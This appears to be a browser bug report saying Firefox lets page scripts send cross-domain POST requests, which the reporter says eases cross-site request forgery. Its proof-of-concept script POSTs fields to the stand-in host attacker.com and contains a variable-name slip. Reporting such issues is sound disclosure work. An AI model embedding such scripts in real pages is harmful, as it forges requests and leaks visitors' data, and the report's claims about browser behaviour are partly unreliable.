Firefox allows cross-domain POST request via JavaScript

Firefox allows the submission of arbitrary POST request domain different from the originating one. This make it a lot easier to mount Cross-Site Request Forgery attacks. Imagine one of the following situation where a JavaScript, which performs a malicious action on a different site (such a posting something on Facebook), is embedded into a site:

- A malicious web site administrator embeds a malicious JavaScript into his site.
- An attacker can embed arbitrary JavaScript into a frequently visited site (such a via a Cross-Site Scripting vulnerability)

Other browser don't allow for cross-domain POST request (i tested IE 8, Opera 10.53 and Chrome 5).

Reproducible: Always

Steps to Reproduce:
The following script demonstrates the issue (embed it into a site different from attacker.com):

<script language="javascript">
var field = {'a' : 'b'};
postToUrl('http://attacker.com', fields);

function postToUrl(url, fields)
{
var http; try { var http = new ActiveXObject('Microsoft.XMLHTTP'); } catch(e) { var http = new XMLHttpRequest(); }

var params = '';
for (var key in fields)
params += key + '=' + fields[key] + '&';

http.open('POST', url, true);
http.send(params);
}
</script>
Actual Results:
The POST request is sent.

Expected Results:
The POST request to domain different from the originating one should be denied.
